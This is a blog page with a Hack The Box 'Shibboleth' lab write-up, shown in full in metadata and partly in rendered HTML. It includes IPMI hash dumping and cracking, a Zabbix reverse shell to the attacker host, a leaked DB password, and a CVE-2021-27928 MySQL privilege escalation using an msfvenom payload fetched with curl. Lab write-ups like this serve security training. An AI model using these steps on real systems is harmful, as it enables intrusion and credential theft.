<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Shibboleth | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Shibboleth - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-06-htb-shibboleth-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-06-htb-shibboleth-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Shibboleth"><meta property="og:description" content="HTB - Shibboleth - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-06-htb-shibboleth-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-06T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-06T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Shibboleth"><meta name=twitter:description content="HTB - Shibboleth - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Shibboleth","item":"https://cadil.github.io/posts/2024-03-06-htb-shibboleth-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Shibboleth","name":"HTB - Shibboleth","description":"HTB - Shibboleth - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine IP 10.10.11.124 2. Nmap nmap -sV -sC -oA nmap/shibboleth 10.10.11.124 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-25 00:44 EST Nmap scan report for 10.10.11.124 Host is up (0.25s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://shibboleth.htb/ Service Info: Host: shibboleth.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds shibboleth.htb -\u003e /etc/hosts\nsudo nmap -sU -top-ports=20 shibboleth.htb Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-25 00:47 EST Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.24s latency). PORT STATE SERVICE 53/udp closed domain 67/udp closed dhcps 68/udp closed dhcpc 69/udp closed tftp 123/udp closed ntp 135/udp closed msrpc 137/udp closed netbios-ns 138/udp closed netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open|filtered snmp 162/udp closed snmptrap 445/udp closed microsoft-ds 500/udp closed isakmp 514/udp closed syslog 520/udp closed route 631/udp closed ipp 1434/udp closed ms-sql-m 1900/udp closed upnp 4500/udp open|filtered nat-t-ike 49152/udp closed unknown Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds 3. Gobuster gobuster dir -u http://shibboleth.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shibboleth.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/25 00:50:21 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 317] [--\u003e http://shibboleth.htb/assets/] /forms (Status: 301) [Size: 316] [--\u003e http://shibboleth.htb/forms/] Хэрэгтэй зүйл олдсонгүй.\n4. Snmpwalk snmpwalk -v2c -c public 10.10.11.124 . \u003e common.txt Timeout: No Response from 10.10.11.124 no response\n5. Ffuf ffuf -u \"http://shibboleth.htb/FUZZ\" -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -fc 403 v1.3.1 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ assets [Status: 301, Size: 317, Words: 20, Lines: 10] forms [Status: 301, Size: 316, Words: 20, Lines: 10] . [Status: 200, Size: 59474, Words: 17014, Lines: 1324] [WARN] Caught keyboard interrupt (Ctrl-C) subdomain\nffuf -u \"http://shibboleth.htb\" -H \"Host:FUZZ.shibboleth.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 v1.3.1 ________________________________________________ :: Method : GET :: URL : http://shibboleth.htb :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ monitor [Status: 200, Size: 3686, Words: 192, Lines: 30] monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30] zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30] :: Progress: [4989/4989] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:32] :: Errors: 0 :: Нэмэх: monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb -\u003e /etc/hosts\nnmap дахин уншуулах:\nsudo nmap -sS -A -sC -sV -Pn -sU --min-rate 5000 10.10.11.124 удаад байна\nsudo nmap -sU -sV -sC shibboleth.htb -T4 удаад байна\nsudo nmap -sU -sV -sC 10.10.11.124 --min-rate 7500 -F 6. User Datagram Protocol (UDP) User Datagram Protocol (UDP) is a communications protocol that is primarily used to establish low-latency and loss-tolerating connections between applications on the internet.\nNmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.24s latency). Not shown: 93 open|filtered ports PORT STATE SERVICE VERSION 520/udp closed route 623/udp open asf-rmcp 999/udp closed applix 1433/udp closed ms-sql-s 1645/udp closed radius 31337/udp closed BackOrifice 49152/udp closed unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port623-UDP:V=7.91%I=7%D=2/25%Time=62187E64%P=x86_64-pc-linux-gnu%r(ipm SF:i-rmcp,1E,\"\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01 SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 603.57 seconds 623/udp open asf-rmcp\n7. Metasploit 623/udp open asf-rmcp\nsudo msfdb run use auxiliary/scanner/ipmi/ipmi_version ### show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M etasploit RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads set RHOSTS 10.10.11.124 run [*] Sending IPMI requests to 10.10.11.124-\u003e10.10.11.124 (1 hosts) [+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed IPMI - IPMI-2.0 use auxiliary/scanner/ipmi/ipmi_dumphashes set RHOSTS 10.10.11.124 run [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Administrator\nHashcat\nvi hash ## add # 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6 hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt 7300 | IMPI2 RAKP HMAC-SHA1 | Network Protocol\nDictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 4 secs 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44d8b6fe005174bef1e83cc051b474da123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9c69d04f7d723e389b00bfd89e6ae99276fb99c6:ilovepumkinpie1 Session..........: hashcat Status...........: Cracked Hash.Name........: IPMI2 RAKP HMAC-SHA1 Hash.Target......: 62dd821c020200005e2e318787cfa1ad1422a79bec99e956a44...fb99c6 Time.Started.....: Fri Feb 25 02:34:11 2022 (10 secs) Time.Estimated...: Fri Feb 25 02:34:21 2022 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 835.7 kH/s (0.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 7395328/14344385 (51.56%) Rejected.........: 0/7395328 (0.00%) Restore.Point....: 7394304/14344385 (51.55%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: ilovequay -\u003e ilovepaul0 Started: Fri Feb 25 02:33:35 2022 Stopped: Fri Feb 25 02:34:22 2022 Administrator ilovepumkinpie1\n8. Exploitation nc -lvnp 9001 system.run[/bin/bash -c \"/bin/bash -i \u003e\u0026 /dev/tcp/10.10.14.66/9001 0\u003e\u00261\",nowait] 8.1 Shell balance python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm 8.2 User.txt id\nuid=110(zabbix) gid=118(zabbix) groups=118(zabbix passwd\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin zabbix:x:110:118::/var/lib/zabbix/:/usr/sbin/nologin Debian-snmp:x:111:119::/var/lib/snmp:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ipmi-svc\nsu - ipmi-svc ilovepumkinpie1 #id uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc) user.txt\n1bcfcca******* 9. Enumeration linpeas\ntmp$ chmod +x linpeas.sh ./linpeas.sh ╔══════════╣ Readable files belonging to root and readable by me but not world readable -rw-r----- 1 root ipmi-svc 22306 Oct 18 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist -rw-r----- 1 root ipmi-svc 21863 Apr 24 2021 /etc/zabbix/zabbix_server.conf ╔══════════╣ Analyzing Zabbix Files (limit 70) -rw-r----- 1 root ipmi-svc 21863 Apr 24 2021 /etc/zabbix/zabbix_server.conf LogFile=/var/log/zabbix/zabbix_server.log LogFileSize=0 PidFile=/run/zabbix/zabbix_server.pid SocketDir=/run/zabbix DBName=zabbix DBUser=zabbix DBPassword=bloooarskybluh mysql -D zabbix -u zabbix -p 9.1 CVE-2021-27928 Local VM\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.66 LPORT=9003 -f elf-so -o elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf-so file: 476 bytes Saved as: elf mv elf www python3 http.server # Machine VM curl 10.10.14.66:9003/elf -o elf # Local VM nc -lvnp 9003 mysql\nSET GLOBAL wsrep_provider=\"/tmp/elf\"; shell balance:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' root.txt\n9a41bd********* ","wordCount":"1113","inLanguage":"mn","datePublished":"2024-03-06T00:00:00Z","dateModified":"2024-03-06T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-06-htb-shibboleth-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Shibboleth</h1><div class=post-description>HTB - Shibboleth - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-06 00:00:00 +0000 UTC'>гуравдугаар сар 6, 2024</span>&nbsp;·&nbsp;6 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-snmpwalk aria-label="4. Snmpwalk">4. Snmpwalk</a></li><li><a href=#5-ffuf aria-label="5. Ffuf">5. Ffuf</a></li><li><a href=#6-user-datagram-protocol-udp aria-label="6. User Datagram Protocol (UDP)">6. User Datagram Protocol (UDP)</a></li><li><a href=#7-metasploit aria-label="7. Metasploit">7. Metasploit</a></li><li><a href=#8-exploitation aria-label="8. Exploitation">8. Exploitation</a><ul><li><a href=#81-shell-balance aria-label="8.1 Shell balance">8.1 Shell balance</a></li><li><a href=#82-usertxt aria-label="8.2 User.txt">8.2 User.txt</a></li></ul></li><li><a href=#9-enumeration aria-label="9. Enumeration">9. Enumeration</a><ul><li><a href=#91-cve-2021-27928 aria-label="9.1 CVE-2021-27928">9.1 CVE-2021-27928</a></li></ul></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine IP</span>
</span></span><span style=display:flex><span>10.10.11.124
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/shibboleth 10.10.11.124
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-25 00:44 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.124
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.25s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>999</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://shibboleth.htb/
</span></span><span style=display:flex><span>Service Info: Host: shibboleth.htb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 26.19 seconds
</span></span></code></pre></div><p>shibboleth.htb -> <code>/etc/hosts</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sU -top-ports<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span> shibboleth.htb
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-25 00:47 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> shibboleth.htb <span style=color:#f92672>(</span>10.10.11.124<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE         SERVICE
</span></span><span style=display:flex><span>53/udp    closed        domain
</span></span><span style=display:flex><span>67/udp    closed        dhcps
</span></span><span style=display:flex><span>68/udp    closed        dhcpc
</span></span><span style=display:flex><span>69/udp    closed        tftp
</span></span><span style=display:flex><span>123/udp   closed        ntp
</span></span><span style=display:flex><span>135/udp   closed        msrpc
</span></span><span style=display:flex><span>137/udp   closed        netbios-ns
</span></span><span style=display:flex><span>138/udp   closed        netbios-dgm
</span></span><span style=display:flex><span>139/udp   open|filtered netbios-ssn
</span></span><span style=display:flex><span>161/udp   open|filtered snmp
</span></span><span style=display:flex><span>162/udp   closed        snmptrap
</span></span><span style=display:flex><span>445/udp   closed        microsoft-ds
</span></span><span style=display:flex><span>500/udp   closed        isakmp
</span></span><span style=display:flex><span>514/udp   closed        syslog
</span></span><span style=display:flex><span>520/udp   closed        route
</span></span><span style=display:flex><span>631/udp   closed        ipp
</span></span><span style=display:flex><span>1434/udp  closed        ms-sql-m
</span></span><span style=display:flex><span>1900/udp  closed        upnp
</span></span><span style=display:flex><span>4500/udp  open|filtered nat-t-ike
</span></span><span style=display:flex><span>49152/udp closed        unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 11.64 seconds
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://shibboleth.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                               
</span></span><span style=display:flex><span>Gobuster v3.1.0                                                                                                               
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>                                                                 
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                               
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://shibboleth.htb                                                                            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET                                                                                              
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>                                                                                               
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt                                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>                                                                                              
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0                                                                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s                                                                                              
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                               
</span></span><span style=display:flex><span>2022/02/25 00:50:21 Starting gobuster in directory enumeration mode                                                           
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>                                                               
</span></span><span style=display:flex><span>/assets               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 317<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://shibboleth.htb/assets/<span style=color:#f92672>]</span>                                           
</span></span><span style=display:flex><span>/forms                <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 316<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://shibboleth.htb/forms/<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Хэрэгтэй зүйл олдсонгүй.</p><h3 id=4-snmpwalk>4. Snmpwalk<a hidden class=anchor aria-hidden=true href=#4-snmpwalk>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>snmpwalk -v2c -c public 10.10.11.124 . &gt; common.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Timeout: No Response from 10.10.11.124
</span></span></code></pre></div><p>no response</p><h3 id=5-ffuf>5. Ffuf<a hidden class=anchor aria-hidden=true href=#5-ffuf>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -u <span style=color:#e6db74>&#34;http://shibboleth.htb/FUZZ&#34;</span> -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -fc <span style=color:#ae81ff>403</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>       v1.3.1
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://shibboleth.htb/FUZZ
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span> :: Threads          : <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span style=display:flex><span> :: Filter           : Response status: <span style=color:#ae81ff>403</span>
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>assets                  <span style=color:#f92672>[</span>Status: 301, Size: 317, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>forms                   <span style=color:#f92672>[</span>Status: 301, Size: 316, Words: 20, Lines: 10<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>.                       <span style=color:#f92672>[</span>Status: 200, Size: 59474, Words: 17014, Lines: 1324<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>WARN<span style=color:#f92672>]</span> Caught keyboard interrupt <span style=color:#f92672>(</span>Ctrl-C<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>subdomain</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -u <span style=color:#e6db74>&#34;http://shibboleth.htb&#34;</span> -H <span style=color:#e6db74>&#34;Host:FUZZ.shibboleth.htb&#34;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc <span style=color:#ae81ff>200</span>
